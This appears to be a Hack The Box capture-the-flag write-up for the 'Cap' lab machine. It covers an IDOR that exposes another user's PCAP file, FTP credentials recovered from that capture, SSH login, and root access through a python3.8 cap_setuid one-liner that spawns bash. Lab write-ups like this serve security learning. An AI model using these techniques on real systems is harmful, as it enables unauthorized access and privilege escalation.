# Cap - HTB Write-Up

## Introduction
Cap is an Easy-rated Linux machine demonstrating IDOR vulnerabilities and Linux capability exploitation.

---

## Enumeration

Basic nmap scan revealed three open ports:

```bash
nmap -sC -sV 10.10.10.245
```

**Results:**
- Port 21 (FTP)
- Port 22 (SSH)
- Port 80 (HTTP)

---

## Initial Access

### IDOR Vulnerability

Found a security dashboard web application at port 80. The URL structure included a data parameter:

```
http://10.10.10.245/data/1
```

Changed the parameter to `0` to access another user's data:

```
http://10.10.10.245/data/0
```

Downloaded the PCAP file from this endpoint.

### PCAP Analysis with Wireshark

Opened the downloaded PCAP file in Wireshark and analyzed the network traffic. Found FTP authentication credentials in plaintext:

```
Filter: ftp
Username: nathan
Password: [discovered in FTP traffic]
```

### SSH Access

Used the discovered credentials:

```bash
ssh nathan@10.10.10.245
```

Retrieved user flag from `/home/nathan/user.txt`

---

## Privilege Escalation

### Linux Capabilities

Enumerated binaries with special capabilities:

```bash
getcap -r / 2>/dev/null
```

Found multiple binaries with capabilities:
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

The key finding is `/usr/bin/python3.8` with `cap_setuid` capability, which allows changing the process user ID.

### Exploitation

Exploited the `cap_setuid` capability to escalate to root:

```bash
/usr/bin/python3.8 -c "import os;os.setuid(0);os.system('/bin/bash')"
```

This spawned a root shell. Retrieved root flag from `/root/root.txt`

---

## Tools Used

- nmap
- Wireshark
- ssh
- getcap
- python3.8

---

## What I Learned

- IDOR vulnerabilities allow accessing other users' data by manipulating ID parameters
- Wireshark is essential for analyzing PCAP files and finding credentials in network traffic
- Linux capabilities like `cap_setuid` can be exploited for privilege escalation
- Always check for capabilities with `getcap -r / 2>/dev/null`

---

## Key Commands

```bash
# Enumeration
nmap -sC -sV 10.10.10.245

# Download PCAP
wget http://10.10.10.245/download/0

# SSH with found credentials
ssh nathan@10.10.10.245

# Find capabilities
getcap -r / 2>/dev/null

# Exploit cap_setuid
/usr/bin/python3.8 -c "import os;os.setuid(0);os.system('/bin/bash')"
```

---

**Disclaimer:** This write-up is for educational purposes only. Always obtain proper authorization before testing security on systems you don't own.
